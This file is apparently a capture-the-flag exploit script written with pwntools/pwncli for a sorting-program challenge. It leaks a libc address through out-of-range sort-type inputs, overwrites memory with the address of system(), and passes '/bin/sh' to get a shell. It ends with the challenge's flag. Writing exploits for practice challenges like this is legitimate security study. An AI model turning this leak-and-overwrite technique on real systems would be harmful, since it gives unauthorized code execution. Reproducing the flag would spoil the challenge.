#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *
import random

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

context.log_level = "info"


def cmd(count, ints, idx):
    ru(b"How many ints?\n")
    sl(i2b(count))
    ru(b"Input ints (separate by space):\n")
    sl(ints)
    ru(b"Input sort type (1 = forward, 2 = reverse):\n")
    sl(i2b(idx))


length = 0x111
payload_list = [random.randint(1, 0xFFFFFF) for i in range(length)]
payload_list = [str(i) for i in payload_list]
cmd(length, " ".join(payload_list).encode(), 10)

length = 0x111
payload_list = [0 for i in range(length)]
payload_list = [str(i) for i in payload_list]
cmd(length, " ".join(payload_list).encode(), 11)
# cmd(length, " ".join(payload_list).encode(), 1)

for i in range(0x432):
    lg("i", i)
    length = 2
    payload_list = [0 for i in range(length)]
    payload_list = [str(i) for i in payload_list]
    cmd(length, " ".join(payload_list).encode(), 1)

ru(b"How many ints?\n")
sl(i2b(0x10))
ru(b"Input ints (separate by space):\n")
sl(b"\x00")

for x in range(0x20):
    lg("x", x)
    length = 2
    payload_list = [x for i in range(length)]
    payload_list = [str(i) for i in payload_list]
    cmd(length, " ".join(payload_list).encode(), 1)

ru(b"Sorted array:\n31")
ru(b"Sorted array:\n")
leak1 = int(ru(b" "))
if leak1 < 0:
    leak1 = (1 << 32) + leak1
leak2 = int(ru(b" "))
if leak2 < 0:
    leak2 = (1 << 32) + leak2
lg("leak1", leak1)
lg("leak2", leak2)
libc_base = (leak2 << 32) | leak1
libc_base = libc_base - 0x203F20
lg("libc_base", libc_base)

length = 0x10
payload_list = [i for i in range(length)]
for i in range(0, length, 2):
    payload_list[i] = (libc_base + libc.sym.system) & 0xFFFFFFFF
for i in range(1, length, 2):
    payload_list[i] = ((libc_base + libc.sym.system) >> 32) & 0xFFFFFFFF

payload_list = [str(i) for i in payload_list]
cmd(length, " ".join(payload_list).encode(), 11)

for x in range(0x20):
    lg("x", x)
    length = 2
    payload_list = [x for i in range(length)]
    payload_list = [str(i) for i in payload_list]
    cmd(length, " ".join(payload_list).encode(), 1)

length = 0x40
payload_list = [random.randint(1, 0xFFFFFF) for i in range(length)]
off = 0
payload = b"/bin/sh\x00"
for i in range(off, len(payload) + off, 4):
    payload_list[i // 4] = u32_ex((payload[i - off :])[:4])

payload_list = [str(i) for i in payload_list]
debugB()
cmd(
    length,
    " ".join(payload_list).encode(),
    ((0x7FFFFFFFD738 - 0x7FFFFFFFDB90) // 8) + 1,
)

ia()

# LITCTF{qs0rt_r4nks_k4t0u_b3st_g1rl}
